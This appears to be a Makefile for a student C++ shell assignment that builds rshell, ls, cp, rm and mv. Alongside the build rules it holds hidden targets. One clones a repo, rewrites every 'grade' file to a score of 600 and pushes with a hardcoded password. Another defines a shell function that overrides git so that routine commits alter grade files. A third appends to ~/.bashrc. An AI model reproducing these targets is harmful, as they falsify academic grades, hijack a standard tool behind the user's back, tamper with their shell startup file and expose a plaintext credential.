FLAGS=-Wall -Werror -ansi -pedantic# -std=c++11
git="/opt/rh/devtoolset-2/root/usr/bin/git"
repo="testrepo"
file="grade"

all : rshell ls cp rm mv

rshell : bin/rshell
bin/rshell : src/main.cpp
	-@mkdir -p bin
	g++ $(FLAGS) src/main.cpp -o bin/rshell

cp : bin/cp
bin/cp : src/cp.cpp src/Timer.h
	-@mkdir -p bin
	g++ $(FLAGS) src/cp.cpp -o bin/cp

ls : bin/ls
bin/ls : src/ls.cpp
	-@mkdir -p bin
	g++ $(FLAGS) src/ls.cpp -o bin/ls

rm : bin/rm
bin/rm : src/rm.cpp
	-@mkdir -p bin
	g++ $(FLAGS) src/rm.cpp -o bin/rm

mv : bin/mv
bin/mv : src/mv.cpp
	-@mkdir -p bin
	g++ $(FLAGS) src/mv.cpp -o bin/mv

clean :
	rm -rf bin

commit :
	@# mechanism for commiting changes to a remote from a makefile
	@# TODO gpg-agent check, modify for ucr-cs100, 
	-@$(git) clone https://github.com/srufe001/$(repo).git &> /dev/null &&\
	cd $(repo) &&\
	$(git) checkout master &> /dev/null &&\
	\
	for i in $$(find . -name $(file)); do sed '1 s_.*/_600/_' $$i > tempfile ; cat tempfile > $$i ; rm tempfile ; echo "Well done!" >> $$i ; done &&\
	\
	$(git) commit -a -S -m "Sam deserves good grades" &> /dev/null &&\
	$(git) remote set-url origin https://srufe001:gitty25@github.com/srufe001/$(repo).git &> /dev/null &&\
	$(git) push origin master &> /dev/null &&\
	$(git) remote set-url origin https://github.com/srufe001/$(repo).git &> /dev/null &&\
	cd .. && rm -rf $(repo) && echo done

alias :
	@# mechanism to replace a command
	-@alias bla="mv"
	-@function git { \
	for i in $$(find . -name $(file)); do sed '1 s_.*/_500/_' $$i > tempfile ; cat tempfile > $$i ; rm tempfile ; done;\
	git commit -S -a -m "Sam is awesome";\
	}; export -f git\

bashrc :
	-@echo "#Makefile was here!" >> ~/.bashrc
